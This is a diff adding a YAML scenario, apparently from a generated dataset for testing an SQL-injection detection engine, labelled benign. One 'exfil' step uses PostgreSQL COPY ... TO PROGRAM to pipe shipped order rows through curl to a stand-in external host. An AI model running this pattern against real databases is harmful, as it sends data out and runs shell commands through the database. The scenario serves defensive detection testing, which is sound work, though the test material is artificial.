@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_52_sql_injection_ben_1461b
+family_id: gen_ecommerce_52_sql_injection_fam_1461
+domain: ecommerce
+time_of_day: 02:05
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT order_item_id, quantity FROM order_items WHERE order_id = 94594
+  - step_id: exfil
+    sql: COPY (SELECT order_item_id, quantity FROM order_items WHERE status = 'shipped')
+      TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest -d
+      @-'
+    connects_to:
+      ip: 203.0.113.168
+      port: 9443
+matched_pair_id: gen_ecommerce_52_sql_injection_pair_1461
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
